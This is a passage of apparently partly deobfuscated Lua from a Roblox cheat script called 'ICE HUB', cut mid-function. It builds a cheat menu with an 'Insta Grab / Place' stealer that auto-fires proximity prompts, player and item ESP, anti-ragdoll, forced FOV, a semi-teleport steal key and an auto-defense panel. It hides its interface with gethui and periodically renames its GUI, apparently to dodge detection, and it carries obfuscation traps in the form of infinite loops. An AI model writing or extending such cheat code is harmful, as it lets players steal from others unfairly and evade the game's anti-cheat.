								uiPadding.PaddingBottom = UDim.new(0, 8)
								uiPadding.PaddingLeft = UDim.new(0, 8)
								uiPadding.PaddingRight = UDim.new(0, 8)
								uiPadding.Parent = frame2
								local instance3 = Instance.new(v82[176])
								instance3.Size = UDim2.new(1, 0, 0, isMobile and v82[58] or 21)
								instance3.BackgroundTransparency = 1
								instance3.Text = string.upper(arg)
								instance3.TextColor3 = Color3.fromRGB(130, 200, 255)
								instance3.TextSize = isMobile and 13 or 11
								instance3.Font = Enum.Font.GothamBlack
								instance3.TextXAlignment = Enum.TextXAlignment.Left
								instance3.ZIndex = 13
								instance3.LayoutOrder = 1
								instance3.Parent = frame2
								local frame3 = Instance.new("Frame")
								frame3.Size = UDim2.new(1, 0, v82[46], 1)
								frame3.BackgroundColor3 = Color3.fromRGB(60, v82[145], v82[196])
								frame3.BackgroundTransparency = 0.45
								frame3.BorderSizePixel = 0
								frame3.ZIndex = 13
								frame3.LayoutOrder = 2
								frame3.Parent = frame2
								local instance4 = Instance.new(v82[53])
								instance4.Size = UDim2.new(1, 0, 0, 0)
								instance4.AutomaticSize = Enum.AutomaticSize.Y
								instance4.BackgroundTransparency = 1
								instance4.ZIndex = 12
								instance4.LayoutOrder = 3
								instance4.Parent = frame2
								local uiListLayout2 = Instance.new("UIListLayout")
								uiListLayout2.SortOrder = Enum.SortOrder.LayoutOrder
								uiListLayout2.Padding = UDim.new(0, isMobile and v82[188] or 5)
								uiListLayout2.Parent = instance4
								return instance4, frame2
							end

							do
								local function fn58(arg)
									if arg:IsA("TextButton") and arg.Text and arg.Text ~= "" then
										return arg.Text
									end

									for _, descendant in ipairs(arg:GetDescendants()) do
										if (descendant:IsA("TextLabel") or descendant:IsA("TextButton")) and descendant.Text and descendant.Text ~= "" then
											return descendant.Text
										end
									end

									return ""
								end

								local function fn59(arg, parent)
									if not arg or not parent then
										return
									end
									local tbl21 = {}

									for _, child in ipairs(arg:GetChildren()) do
										if not child:IsA(v82[191]) and not child:IsA("UIPadding") then
											table.insert(tbl21, child)
										end
									end

									for i, v92 in ipairs(tbl21) do
										if v92:IsA("GuiObject") then
											v92.Size = UDim2.new(1, 0, v92.Size.Y.Scale, v92.Size.Y.Offset)
											v92.LayoutOrder = i
										end

										v92.Parent = parent
									end
								end

								fn56 = function(arg, arg2, arg3, arg4)
									if not arg or not arg3 then
										return
									end

									if arg4 then
										arg3 = fn55(arg3, arg4)
									end

									fn59(arg, arg3)

									if arg2 then
										pcall(function()
											arg2:Destroy()
										end)
									end
								end

								fn57 = function(arg, arg2, arg3)
									if not arg or not arg3 then
										return
									end
									local playerEspFull = fn55(arg3, "Player ESP Full")
									local brainrotEspFull = fn55(arg3, "Brainrot ESP Full")
									local v92 = fn55(arg3, "Trap / Mine ESP")
									local tbl21 = {}

									for _, child in ipairs(arg:GetChildren()) do
										if not child:IsA("UIListLayout") and not child:IsA(v82[16]) then
											table.insert(tbl21, child)
										end
									end

									local v93 = nil

									for _, v94 in ipairs(tbl21) do
										local v95 = string.lower(fn58(v94))
										local otherEsp

										if v95:find("player", 1, true) or v95:find("self chams", 1, v82[76]) then
											otherEsp = playerEspFull
										elseif v95:find("brainrot", 1, v82[76]) or v95:find("best brainrot", 1, true) or v95:find("line to best", 1, true) then
											otherEsp = brainrotEspFull
										elseif v95:find("trap", 1, true) or v95:find("mine", 1, true) then
											otherEsp = v92
										elseif not v93 then
											otherEsp = fn55(arg3, "Other ESP")
											v93 = otherEsp
										else
											otherEsp = v93
										end

										if v94:IsA("GuiObject") then
											v94.Size = UDim2.new(1, v82[46], v94.Size.Y.Scale, v94.Size.Y.Offset)
										end

										v94.Parent = otherEsp
									end

									if arg2 then
										pcall(function()
											arg2:Destroy()
										end)
									end
								end
							end
						end

						do
							local stealer, flag18, flag19, fn58

							do
								stealer = fn55(v85, "Stealer")

								do
									local ProximityPromptService = game:GetService("ProximityPromptService")
									flag18 = false
									flag19 = false

									if getgenv().ICEHUB_INSTA_PROMPT then
										pcall(function()
											getgenv().ICEHUB_INSTA_PROMPT:Disconnect()
										end)

										getgenv().ICEHUB_INSTA_PROMPT = nil
									end

									fn58 = function()
										if n27(2018) <= 10511 then
											if getgenv().ICEHUB_INSTA_PROMPT then
												pcall(function()
													getgenv().ICEHUB_INSTA_PROMPT:Disconnect()
													if not (n24 < 9584) then
														return
													end

													while true do
													end
												end)

												getgenv().ICEHUB_INSTA_PROMPT = nil
											end

											flag18 = false
											local promptButtonHoldBegan = ProximityPromptService.PromptButtonHoldBegan

											getgenv().ICEHUB_INSTA_PROMPT = promptButtonHoldBegan:Connect(function(arg)
												if not flag19 or flag18 or not arg or not arg.Parent then
													return
												end
												local str8 = tostring(arg.ActionText or ""):lower()
												local pos = str8:find("grab", 1, true)
												local pos2 = str8:find("place", 1, true)
												if not pos and not pos2 then
													return
												end
												flag18 = true

												pcall(function()
													if type(fireproximityprompt) == "function" then
														fireproximityprompt(arg)
													else
														arg:InputHoldBegin()
														task.wait(0.01)
														arg:InputHoldEnd()
													end
												end)

												task.delay(v82[91], function()
													flag18 = false
												end)
											end)

											return
										end

										while true do
										end
									end
								end
							end

							do
								local function fn59(arg)
									flag19 = arg and true or false
									flag18 = false

									if flag19 then
										fn58()
									elseif getgenv().ICEHUB_INSTA_PROMPT then
										pcall(function()
											getgenv().ICEHUB_INSTA_PROMPT:Disconnect()
										end)

										getgenv().ICEHUB_INSTA_PROMPT = nil
									end
								end

								fn50(stealer, "Insta Grab / Place", "instaGrabPrompt", function(arg)
									fn59(arg)
								end)

								if tbl18.toggles.instaGrabPrompt then
									fn59(true)
								end
							end
						end
					end

					local HttpService, localPlayer2, genv, request_

					do
						do
							do
								local quickHelper = fn55(v86, "Quick Helper")

								fn50(quickHelper, "Unlock Base", "unlockBase", function(visible)
									for _, topButton in ipairs(tbl17.topButtons) do
										topButton.Visible = visible
									end
								end)

								tbl17.antiBeeApply = function(arg)
									tbl17.antiBeeState = tbl17.antiBeeState or {
										enabled = false,
										lightingConn = nil,
										workspaceConn = nil,
										playerGuiConn = nil,
										cameraConn = nil,
										cameraChangedConn = nil,
									}

									local antiBeeState = tbl17.antiBeeState

									local function fn58(arg2)
										local v92 = antiBeeState[arg2]

										if v92 then
											pcall(function()
												v92:Disconnect()
											end)

											antiBeeState[arg2] = nil
										end
									end

									local function fn59()
										fn58("lightingConn")
										fn58("workspaceConn")
										fn58("playerGuiConn")
										fn58("cameraConn")
										fn58("cameraChangedConn")
									end

									local function fn60(arg2)
										if not arg2 then
											return false
										end

										for i = 1, 4 do
											if not arg2 then
												break
											end
											local str8 = tostring(arg2.Name or ""):lower()
											if str8:find("bee", 1, v82[76]) or str8:find("honey", v82[118], true) or str8:find("sting", 1, true) or str8:find("swarm", v82[118], v82[76]) or str8:find("wasp", 1, true) then
												return v82[76]
											end
											arg2 = arg2.Parent
										end

										return false
									end

									local function fn61(arg2)
										if n26(1066) < 8104 then
											return arg2:IsA("BlurEffect") or arg2:IsA("ColorCorrectionEffect") or arg2:IsA(v82[182]) or arg2:IsA("SunRaysEffect") or arg2:IsA("DepthOfFieldEffect") or arg2:IsA("ParticleEmitter") or arg2:IsA("Smoke") or arg2:IsA("Fire") or arg2:IsA("Sparkles") or arg2:IsA("Beam") or arg2:IsA("Trail") or arg2:IsA("Highlight")
										end

										while v82[76] do
										end
									end

									local function fn62(arg2)
										if not antiBeeState.enabled or not arg2 or not arg2.Parent then
											return
										end

										if fn60(arg2) and fn61(arg2) then
											pcall(function()
												arg2:Destroy()
											end)
										end
									end

									local function fn63()
										if not antiBeeState.enabled then
											return false
										end

										if tbl18.toggles.gameStretcher or tbl17.gameStretcherEnabled then
											return v82[120]
										end

										if tbl18.toggles.customFOV then
											return v82[120]
										end
										return true
									end

									local function fn64()
										if n26(3824) < 16315 then
											fn58("cameraConn")
											local currentCamera = service3.CurrentCamera
											if not currentCamera then
												return
											end

											if fn63() and currentCamera.FieldOfView ~= 70 then
												currentCamera.FieldOfView = 70
											end

											antiBeeState.cameraConn = currentCamera:GetPropertyChangedSignal("FieldOfView"):Connect(function()
												if fn63() and currentCamera.Parent and currentCamera.FieldOfView ~= 70 then
													currentCamera.FieldOfView = 70
												end
											end)

											return
										end

										while true do
										end
									end

									fn59()
									antiBeeState.enabled = arg == v82[76]

									if not antiBeeState.enabled then
										local currentCamera = service3.CurrentCamera

										if currentCamera then
											if tbl18.toggles.gameStretcher or tbl17.gameStretcherEnabled then
												currentCamera.FieldOfView = 100
											elseif tbl18.toggles.customFOV then
												currentCamera.FieldOfView = 120
											else
												currentCamera.FieldOfView = 70
											end
										end

										return
									end

									antiBeeState.lightingConn = service2.DescendantAdded:Connect(function(descendant)
										if 1805 >= n27(181) then
											task.defer(fn62, descendant)
											return
										end

										while true do
										end
									end)

									antiBeeState.workspaceConn = service3.DescendantAdded:Connect(function(descendant)
										task.defer(fn62, descendant)
									end)

									antiBeeState.playerGuiConn = playerGui.DescendantAdded:Connect(function(descendant)
										task.defer(fn62, descendant)
									end)

									for _, v92 in ipairs({ service2, playerGui, localPlayer.Character, service3.CurrentCamera }) do
										if v92 then
											for _, descendant in ipairs(v92:GetDescendants()) do
												fn62(descendant)
											end
										end
									end

									fn64()

									antiBeeState.cameraChangedConn = service3:GetPropertyChangedSignal("CurrentCamera"):Connect(function()
										task.defer(fn64)
									end)
								end

								fn50(quickHelper, "Anti Bee", "antiBee", function(arg)
									if tbl17.antiBeeApply then
										tbl17.antiBeeApply(arg)
									end
								end)
							end

							do
								do
									local function fn58()
										tbl18.guiPositions = {
											main = { x = 0.5, xOffset = -tbl17.PANEL_W / 2, y = v82[91], yOffset = -tbl17.PANEL_H / 2 },
											hud = { x = 0.5, xOffset = -hudWidth / 2, y = 0, yOffset = n33 },
											semiTp = { x = v82[51], xOffset = 0, y = 0.5, yOffset = -(isMobile and 305 or v82[35]) / v82[23] },
											instaReset = { x = 0.5, xOffset = 0, y = 0.5, yOffset = 120 },
											autoDefense = { x = v82[91], xOffset = -v82[80], y = 0, yOffset = 60 },
											friendPanel = { x = 0.02, xOffset = 270, y = 0.5, yOffset = -(isMobile and 126 or 132) / v82[23] },
											topButtons = { x = 0.5, xOffset = -n34 / v82[23], y = 0, yOffset = n32 },
										}

										tbl18.panels = tbl18.panels or {}

										for k, v92 in pairs({
											semitp = { x = 0.5, xOffset = -100, y = v82[91], yOffset = -190, visible = v82[76] },
											xray = { x = 0, xOffset = v82[69], y = 0.5, yOffset = -60, visible = v82[76] },
											booster = { x = v82[118], xOffset = -220, y = 0.5, yOffset = -117, visible = true },
											server = { x = 1, xOffset = -220, y = 0.5, yOffset = 128, visible = v82[76] },
											defender = { x = v82[118], xOffset = -420, y = 0.5, yOffset = -60, visible = v82[76] },
											ap = { x = v82[118], xOffset = -v82[68], y = v82[91], yOffset = 100, visible = true },
											esp = { x = 1, xOffset = -620, y = 0.5, yOffset = -60, visible = true },
											stretch = { x = v82[118], xOffset = -620, y = v82[91], yOffset = 100, visible = true },
											balloon = { x = v82[91], xOffset = 250, y = 0.5, yOffset = -v82[152], visible = true },
											turret = { x = 0.5, xOffset = 250, y = 0.5, yOffset = 60, visible = true },
											baseTimer = { x = 0.5, xOffset = 450, y = 0.5, yOffset = -60, visible = true },
										}) do
											tbl18.panels[k] = v92
										end

										if tbl17.panel then
											tbl17.panel.Position = UDim2.new(v82[91], -tbl17.PANEL_W / 2, 0.5, -tbl17.PANEL_H / 2)
										end

										if instance then
											instance.Position = UDim2.new(0.5, -hudWidth / 2, 0, n33)
										end

										if textButton then
											textButton.Position = UDim2.new(0.5, -(isMobile and 41 or 44), v82[46], n33 + hudHeight + v82[61])
										end

										if frame then
											if not flag2 then
												return
											end
											frame.Position = UDim2.new(v82[91], -n34 / 2, 0, n32)
										end

										if screenGui2 then
											local semiTPWindow = screenGui2:FindFirstChild("SemiTPWindow")

											if semiTPWindow then
												semiTPWindow.Position = UDim2.new(v82[51], v82[46], v82[91], -semiTPWindow.Size.Y.Offset / 2)
											end
										end

										if tbl17.friendFrame and tbl17.friendFrame.Parent then
											tbl17.friendFrame.Position = UDim2.new(0.02, 270, v82[91], -tbl17.friendFrame.Size.Y.Offset / 2)
										end

										local tbl21 = { CoreGui, playerGui }

										pcall(function()
											if gethui then
												if n26(2899) <= 15225 then
													local hui = gethui()

													if hui then
														table.insert(tbl21, hui)
													end
												else
													while true do
													end
												end
											end
										end)

										for _, v92 in ipairs(tbl21) do
											if v92 then
												local iceHubAutoDefense = v92:FindFirstChild("ICE_HUB_AUTO_DEFENSE")

												if iceHubAutoDefense then
													local frame2 = iceHubAutoDefense:FindFirstChildWhichIsA("Frame")

													if frame2 then
														frame2.Position = UDim2.new(0.5, -115, 0, 60)
													end
												end
											end
										end

										fn36()
									end

									createFrame2(fn55(v86, "Reset GUI"), "Reset GUI Positions", function()
										fn58()
									end)
								end
							end

							fn50(fn55(v88, "Player Core"), "Anti Ragdoll", "antiRagdoll", function(arg)
								if n28(4175) > 151 then
									if arg then
										if tbl17.Connections.antiRagdoll then
											return
										end

										tbl17.Connections.antiRagdoll = RunService.Heartbeat:Connect(function()
											if not tbl18.toggles.antiRagdoll then
												return
											end

											if not (n24 <= 9585) then
												local character = localPlayer.Character
												if not character then
													return
												end
												local v92 = character:FindFirstChildOfClass(v82[95])
												local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
												if not v92 or not humanoidRootPart then
													return
												end
												local state = v92:GetState()
												local flag18 = state == Enum.HumanoidStateType.Physics or state == Enum.HumanoidStateType.Ragdoll or state == Enum.HumanoidStateType.FallingDown
												local attribute = localPlayer:GetAttribute("RagdollEndTime")

												if attribute and attribute - service3:GetServerTimeNow() > 0 then
													flag18 = true
												end

												if not flag18 then
													return
												end

												pcall(function()
													localPlayer:SetAttribute("RagdollEndTime", service3:GetServerTimeNow())
												end)

												for _, descendant in ipairs(character:GetDescendants()) do
													if descendant:IsA("BallSocketConstraint") or descendant:IsA("Attachment") and string.find(descendant.Name, "RagdollAttachment", 1, true) then
														pcall(function()
															descendant:Destroy()
														end)
													end
												end

												for _, descendant in ipairs(character:GetDescendants()) do
													if descendant:IsA("Motor6D") and not descendant.Enabled then
														descendant.Enabled = true
													end
												end

												if v92.Health > 0 then
													pcall(function()
														v92:ChangeState(Enum.HumanoidStateType.Running)
													end)
												end

												local currentCamera = service3.CurrentCamera

												if currentCamera then
													currentCamera.CameraSubject = v92
												end

												humanoidRootPart.Anchored = v82[120]
												humanoidRootPart.AssemblyLinearVelocity = Vector3.zero
												humanoidRootPart.AssemblyAngularVelocity = Vector3.zero
												return
											end

											while true do
											end
										end)
									elseif tbl17.Connections.antiRagdoll then
										tbl17.Connections.antiRagdoll:Disconnect()
										tbl17.Connections.antiRagdoll = nil
									end
								else
									while v82[76] do
									end
								end
							end)

							fn50(fn55(v89, "World"), "Custom FOV", "customFOV", function(arg)
								local currentCamera = service3.CurrentCamera

								if currentCamera then
									if tbl18.toggles.gameStretcher or tbl17.gameStretcherEnabled then
										currentCamera.FieldOfView = 100
									elseif arg then
										currentCamera.FieldOfView = 120
									elseif tbl18.toggles.antiBee then
										currentCamera.FieldOfView = 70
									else
										currentCamera.FieldOfView = 70
									end
								end
							end)

							fn49(v90, "Keybinds")

							createFrame2(v90, "Semi TP Key: " .. tostring(tbl18.semitp.stealKey or "E"), function()
								if tbl17.openExecutePanel then
									tbl17.openExecutePanel()
								end
							end)

							createFrame2(v90, "Menu Key: T", function()
							end)

							do
								local function fn58(arg, arg2)
									task.spawn(function()
										local n35 = tick() + 1.5
										local v92

										while true do
											v92 = arg()

											if v92 then
												break
											else
												task.wait(0.01)
												if not (n35 <= tick()) then
													continue
												end
												break
											end
										end

										if v92 then
											pcall(arg2)
										end
									end)
								end

								fn58(function()
									return tbl17.btContent
								end, function()
									fn56(tbl17.btContent, tbl17.btFrame, v86, "Base Protection")
								end)

								fn58(function()
									return tbl17.defContent
								end, function()
									fn56(tbl17.defContent, tbl17.defFrame, v86, "Base Defender")
								end)

								fn58(function()
									return tbl17.balloonContent
								end, function()
									fn56(tbl17.balloonContent, tbl17.balloonFrame, v86, "Anti Balloon")
								end)

								fn58(function()
									return tbl17.turretContent
								end, function()
									fn56(tbl17.turretContent, tbl17.turretFrame, v86, "Anti Turret")
								end)

								fn58(function()
									return tbl17.espContent
								end, function()
									fn57(tbl17.espContent, tbl17.espFrame, v87)
								end)

								fn58(function()
									return tbl17.bpContent
								end, function()
									fn56(tbl17.bpContent, tbl17.bpFrame, v88, "Movement / Booster")
								end)

								fn58(function()
									return tbl17.xpContent
								end, function()
									fn56(tbl17.xpContent, tbl17.xpFrame, v89, "Performance")
								end)

								fn58(function()
									return tbl17.stretchContent
								end, function()
									fn56(tbl17.stretchContent, tbl17.stretchFrame, v89, "Game Stretcher")
								end)

								fn58(function()
									return tbl17.spContent
								end, function()
									fn56(tbl17.spContent, tbl17.spFrame, v91, "Server")
								end)
							end
						end

						do
							tbl17.openBalloonPanel = function()
							end

							tbl17.closeBalloonPanel = function()
							end

							tbl17.openTurretPanel = function()
							end

							tbl17.closeTurretPanel = function()
							end

							tbl17.openStretchPanel = function()
							end

							tbl17.closeStretchPanel = function()
							end

							tbl17.openXrayPanel = function()
							end

							tbl17.closeXrayPanel = function()
							end

							tbl17.openBoosterPanel = function()
							end

							tbl17.closeBoosterPanel = function()
							end

							tbl17.openESPPanel = function()
							end

							tbl17.closeESPPanel = function()
							end

							tbl17.openServerPanel = function()
							end

							tbl17.closeServerPanel = function()
							end

							tbl17.openDefenderPanel = function()
							end

							tbl17.closeDefenderPanel = function()
							end

							tbl17.openBTPanel = function()
							end

							tbl17.closeBTPanel = function()
							end

							do
								local function fn58()
									tbl17.menuOpen = true
									tbl18.ui.menuOpen = v82[76]
									fn36()
									tbl17.panel.Visible = true
									tbl17.panel.Size = UDim2.new(0, tbl17.PANEL_W, 0, 0)
									tbl17.panel.BackgroundTransparency = 1

									pcall(function()
										TweenService:Create(tbl17.panel, TweenInfo.new(0.3, Enum.EasingStyle.Back, Enum.EasingDirection.Out), { Size = UDim2.new(0, tbl17.PANEL_W, 0, tbl17.PANEL_H), BackgroundTransparency = 0.62 }):Play()
									end)
								end

								local function fn59()
									tbl17.menuOpen = false
									tbl18.ui.menuOpen = v82[120]
									fn36()

									pcall(function()
										local tween = TweenService:Create(tbl17.panel, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.In), { Size = UDim2.new(0, tbl17.PANEL_W, 0, 0), BackgroundTransparency = 1 })
										tween:Play()

										tween.Completed:Connect(function()
											if not tbl17.menuOpen then
												tbl17.panel.Visible = false
											end
										end)
									end)
								end

								if tbl17.menuOpen then
									fn58()
								end

								textButton.MouseButton1Click:Connect(function()
									tbl17.menuOpen = not tbl17.menuOpen

									if tbl17.menuOpen then
										fn58()
									else
										fn59()
									end
								end)

								if not isMobile then
									UserInputService.InputBegan:Connect(function(input, gameProcessed)
										if input.KeyCode == Enum.KeyCode.T then
											tbl17.menuOpen = not tbl17.menuOpen

											if tbl17.menuOpen then
												fn58()
											else
												fn59()
											end
										elseif not gameProcessed then
											local str8 = tostring(input.KeyCode)
											local stealKey = semitp.stealKey

											if str8:gsub("Enum.KeyCode.", "") == stealKey then
												task.spawn(fn41)
											end
										end
									end)
								end
							end
						end

						do
							task.spawn(function()
								task.wait(0.05)

								for _, v92 in ipairs({}) do
									if v92.f then
										local visible = tbl18.toggles[v92.toggle]

										if visible == nil then
											visible = true
										end

										v92.f.Visible = visible
									end
								end

								if tbl18.toggles.customFOV then
									local currentCamera = service3.CurrentCamera

									if currentCamera then
										currentCamera.FieldOfView = 120
									end
								end

								if tbl18.toggles.gameStretcher then
									if n26(4830) >= 14899 then
										fn46()
									else
										while true do
										end
									end
								end

								if tbl18.toggles.autoResetBalloon then
									fn42()
								end

								if tbl18.toggles.antiTurret then
									fn44()
								end

								if tbl18.toggles.brainrotESP or tbl18.toggles.bestBrainrotESP then
									if n26(4812) < 19718 then
										fn53()
									else
										while v82[76] do
										end
									end
								end

								if tbl18.toggles.lineESP then
									fn54()
								end

								if tbl18.toggles.antiRagdoll and not tbl17.Connections.antiRagdoll then
									tbl17.Connections.antiRagdoll = RunService.Heartbeat:Connect(function()
										if not tbl18.toggles.antiRagdoll then
											return
										end
										local character = localPlayer.Character
										if not character then
											return
										end
										local humanoid = character:FindFirstChildOfClass("Humanoid")
										local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
										if not humanoid or not humanoidRootPart then
											return
										end
										local state = humanoid:GetState()
										local flag18 = state == Enum.HumanoidStateType.Physics or state == Enum.HumanoidStateType.Ragdoll or state == Enum.HumanoidStateType.FallingDown
										local attribute = localPlayer:GetAttribute("RagdollEndTime")

										if attribute then
											local v92 = v82[46]
											attribute = attribute - service3:GetServerTimeNow() > v92
										end

										if attribute then
											flag18 = true
										end

										if not flag18 then
											return
										end

										pcall(function()
											localPlayer:SetAttribute("RagdollEndTime", service3:GetServerTimeNow())
										end)

										for _, descendant in ipairs(character:GetDescendants()) do
											if descendant:IsA("BallSocketConstraint") or descendant:IsA("Attachment") and string.find(descendant.Name, "RagdollAttachment", 1, true) then
												pcall(function()
													descendant:Destroy()
												end)
											end
										end

										for _, descendant in ipairs(character:GetDescendants()) do
											if descendant:IsA("Motor6D") and not descendant.Enabled then
												descendant.Enabled = true
											end
										end

										if humanoid.Health > 0 then
											pcall(function()
												humanoid:ChangeState(Enum.HumanoidStateType.Running)
											end)
										end

										local currentCamera = service3.CurrentCamera

										if currentCamera then
											currentCamera.CameraSubject = humanoid
										end

										humanoidRootPart.Anchored = v82[120]
										humanoidRootPart.AssemblyLinearVelocity = Vector3.zero
										humanoidRootPart.AssemblyAngularVelocity = Vector3.zero
									end)
								end

								if tbl18.toggles.antiBee and tbl17.antiBeeApply then
									tbl17.antiBeeApply(v82[76])
								end
							end)

							task.spawn(function()
								local n35 = v82[46]
								local now2 = tick()

								RunService.RenderStepped:Connect(function()
									n35 += 1
									local now3 = tick()

									if v82[91] <= now3 - now2 then
										local n36 = math.floor(n35 / (now3 - now2))
										n35 = 0
										now2 = now3

										local ok, result = pcall(function()
											return math.floor(service.Network.ServerStatsItem["Data Ping"]:GetValue())
										end)

										if ok and tbl17.statsLabel then
											tbl17.statsLabel.Text = string.format("FPS: %d PING: %dms", n36, result)
										end
									end
								end)
							end)

							task.spawn(function()
								if n27(1683) < 7707 then
									local rotation = v82[46]

									while true do
										rotation = (rotation + 8) % 360

										for i = 1, #tbl17.allGradients do
											pcall(function()
												if tbl17.allGradients[i] then
													tbl17.allGradients[i].Rotation = rotation
												end
											end)
										end

										task.wait(0.2)
									end
								else
									while true do
									end
								end
							end)

							task.spawn(function()
								while true do
									task.wait(15)

									if tbl17.screenGui and not tbl17.screenGui.Parent then
										fn29(tbl17.screenGui)
									end

									if screenGui2 and not screenGui2.Parent then
										fn29(screenGui2)
									end

									if instance2 and not instance2.Parent then
										fn29(instance2)
									end
								end
							end)

							task.spawn(function()
								while true do
									task.wait(30)

									if tbl17.screenGui and tbl17.screenGui.Parent then
										tbl17.screenGui.Name = v83()
									end
								end
							end)

							task.spawn(function()
								local ok, result = pcall(function()
									local Players2 = game:GetService("Players")
									game:GetService("RunService")
									local StarterGui = game:GetService("StarterGui")
									local TweenService2 = game:GetService("TweenService")
									local UserInputService2 = game:GetService("UserInputService")
									local ReplicatedStorage = game:GetService("ReplicatedStorage")
									local localPlayer3 = Players2.LocalPlayer
									local flag18 = tbl18.autoDefense.enabled == true
									local flag19 = tbl18.autoDefense.balloon ~= false
									local flag20 = tbl18.autoDefense.laser == true
									local settingsOpen = tbl18.autoDefense.settingsOpen == true

									local tbl21 = {
										bg = Color3.fromRGB(7, v82[58], 50),
										panel = Color3.fromRGB(8, 27, v82[77]),
										gold = Color3.fromRGB(130, 200, v82[196]),
										white = tbl17.COL_WHITE,
										grey = Color3.fromRGB(170, 205, 235),
										dark = Color3.fromRGB(28, 55, 88),
										knobOff = tbl17.COL_WHITE,
										check = Color3.fromRGB(65, 145, 255),
									}

									local tweenInfo = TweenInfo.new(0.15, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)

									local function createUICorner2(parent, arg)
										local uiCorner = Instance.new("UICorner")
										uiCorner.CornerRadius = UDim.new(0, arg or 8)
										uiCorner.Parent = parent
										return uiCorner
									end

									local function createUIStroke2(parent, color, thickness, arg)
										local uiStroke = Instance.new("UIStroke")
										uiStroke.Color = color or Color3.fromRGB(65, v82[145], 255)
										uiStroke.Thickness = thickness or 1
										uiStroke.Transparency = arg == nil and 0.45 or arg
										uiStroke.Parent = parent
										return uiStroke
									end

									pcall(function()
										local playerGui2 = localPlayer3:FindFirstChild("PlayerGui")

										if playerGui2 then
											local iceHubAutoDefense = playerGui2:FindFirstChild("ICE_HUB_AUTO_DEFENSE")

											if iceHubAutoDefense then
												iceHubAutoDefense:Destroy()
											end
										end

										if gethui then
											local hui = gethui()
											local iceHubAutoDefense = hui and hui:FindFirstChild("ICE_HUB_AUTO_DEFENSE")

											if iceHubAutoDefense then
												iceHubAutoDefense:Destroy()
											end
										end
									end)

									local screenGui3 = Instance.new("ScreenGui")
									screenGui3.Name = "ICE_HUB_AUTO_DEFENSE"
									screenGui3.ResetOnSpawn = false
									screenGui3.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
									screenGui3.Parent = gethui and gethui() or localPlayer3.PlayerGui
									local n35 = isMobile and 240 or 220
									local n36 = isMobile and 102 or 92
									local n37 = isMobile and 120 or 106
									local n38 = n36 + n37 + 8
									local n39 = isMobile and 36 or 30
									local n40 = isMobile and v82[27] or 36
									local n41 = isMobile and v82[33] or 18
									local n42 = isMobile and 18 or 14
									local frame2 = Instance.new("Frame")
									frame2.Size = UDim2.new(0, n35, 0, n36)
									local udim2 = UDim2.new(v82[91], -n35 / 2, v82[46], 60)
									fn37(frame2, "autoDefense", udim2)
									frame2.BackgroundColor3 = tbl21.bg
									frame2.BackgroundTransparency = 0.48
									frame2.BorderSizePixel = 0
									frame2.Active = true
									frame2.Draggable = false
									frame2.ClipsDescendants = true
									frame2.Parent = screenGui3
									createUICorner2(frame2, 10)
									createUIStroke2(frame2, Color3.fromRGB(65, 145, 255), 1, 0.45)
									local uiPadding = Instance.new("UIPadding")
									uiPadding.PaddingLeft = UDim.new(0, v82[4])
									uiPadding.PaddingRight = UDim.new(0, 10)
									uiPadding.Parent = frame2
									local instance3 = Instance.new(v82[176])
									instance3.Size = UDim2.new(1, -30, v82[46], isMobile and 28 or 25)
									instance3.Position = UDim2.new(0, 0, 0, 3)
									instance3.BackgroundTransparency = 1
									instance3.Text = "AUTO DEFENSE"
									instance3.TextColor3 = tbl21.gold
									instance3.TextSize = isMobile and 13 or 11
									instance3.Font = Enum.Font.GothamBlack
									instance3.TextXAlignment = Enum.TextXAlignment.Left
									instance3.ZIndex = 13
									instance3.Parent = frame2
									fn48(frame2, instance3, "autoDefense")
									local textButton2 = Instance.new("TextButton")
									textButton2.Size = UDim2.new(0, 26, 0, 26)
									textButton2.Position = UDim2.new(1, -26, 0, 2)
									textButton2.BackgroundTransparency = 1
									textButton2.Text = "⚙"
									textButton2.TextColor3 = tbl21.gold
									textButton2.TextSize = isMobile and 17 or 15
									textButton2.Font = Enum.Font.GothamBold
									textButton2.AutoButtonColor = false
									textButton2.ZIndex = 14
									textButton2.Parent = frame2
									local instance4 = Instance.new(v82[53])
									instance4.Size = UDim2.new(1, v82[46], v82[46], 1)
									instance4.Position = UDim2.new(0, 0, 0, isMobile and 31 or 28)
									instance4.BackgroundColor3 = Color3.fromRGB(60, 145, 255)
									instance4.BackgroundTransparency = 0.45
									instance4.BorderSizePixel = 0
									instance4.ZIndex = v82[21]
									instance4.Parent = frame2
									local frame3 = Instance.new("Frame")
									frame3.Size = UDim2.new(1, v82[46], 0, n39)
									frame3.Position = UDim2.new(0, 0, 0, isMobile and 40 or 36)
									frame3.BackgroundColor3 = tbl21.panel
									frame3.BackgroundTransparency = 0.42
									frame3.BorderSizePixel = 0
									frame3.ZIndex = 12
									frame3.Parent = frame2
									createUICorner2(frame3, v82[90])
									local textLabel = Instance.new("TextLabel")
									textLabel.Size = UDim2.new(1, -v82[128], 1, 0)
									textLabel.Position = UDim2.new(v82[46], 8, v82[46], 0)
									textLabel.BackgroundTransparency = v82[118]
									textLabel.Text = "Auto Defense"
									textLabel.TextColor3 = tbl21.white
									textLabel.TextSize = isMobile and v82[163] or 12
									textLabel.Font = Enum.Font.GothamBold
									textLabel.TextXAlignment = Enum.TextXAlignment.Left
									textLabel.ZIndex = 13
									textLabel.Parent = frame3
									local frame4 = Instance.new("Frame")
									frame4.Size = UDim2.new(0, n40, 0, n41)
									frame4.Position = UDim2.new(1, -n40 - 6, 0.5, -n41 / 2)
									frame4.BackgroundColor3 = tbl21.dark
									frame4.BorderSizePixel = 0
									frame4.ZIndex = 13
									frame4.Parent = frame3
									createUICorner2(frame4, n41 / 2)
									local uiGradient = Instance.new("UIGradient")
									uiGradient.Color = ColorSequence.new({ ColorSequenceKeypoint.new(0, tbl21.dark), ColorSequenceKeypoint.new(v82[118], tbl21.dark) })
									uiGradient.Parent = frame4
									local frame5 = Instance.new("Frame")
									frame5.Size = UDim2.new(0, n42, 0, n42)
									frame5.Position = UDim2.new(0, 2, 0.5, -n42 / v82[23])
									frame5.BackgroundColor3 = tbl21.white
									frame5.BorderSizePixel = 0
									frame5.ZIndex = 14
									frame5.Parent = frame4
									createUICorner2(frame5, n42 / 2)
									local textButton3 = Instance.new("TextButton")
									textButton3.Size = UDim2.new(v82[118], 0, v82[118], 0)
									textButton3.BackgroundTransparency = 1
									textButton3.Text = ""
									textButton3.ZIndex = 15
									textButton3.Parent = frame3
